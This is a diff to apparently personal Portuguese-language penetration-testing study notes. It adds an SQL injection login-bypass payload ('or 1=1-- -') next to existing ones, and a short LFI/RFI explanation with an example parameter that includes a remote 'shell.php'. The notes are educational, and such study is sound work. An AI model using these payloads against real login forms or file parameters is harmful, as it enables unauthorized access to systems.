@@ -3818,6 +3818,8 @@ Traz as 3 primeiras letras da palavra
 
 	select * from user where login='user' or 1=1;#
 
+	select * from user where login='user' or 1=1-- -
+
 	select * from user where login='user' or true limit 1;#
 
 	select * from user where login='user' and login='user' limit 1;#
@@ -7057,6 +7059,12 @@ Soluções DAST: OwaspZap, Niktop, Wapiti
 WiGLE = Ferramenta que busca redes abertas e informações dos WiFI [WiGle](https://wigle.net)
 
 Spoofing é o ato de falsificar algo
+
+LFI - O arquivo ta na maquina da vitima
+RFI - O Arquivo pode ser acessado atravez de um paramentro em uma maquina remota `param?http://localhost/shell.php` O mesmo nao pode passar parâmetro, pois quebra a URL por conta do ?
+
+
+
 .
 .
 .
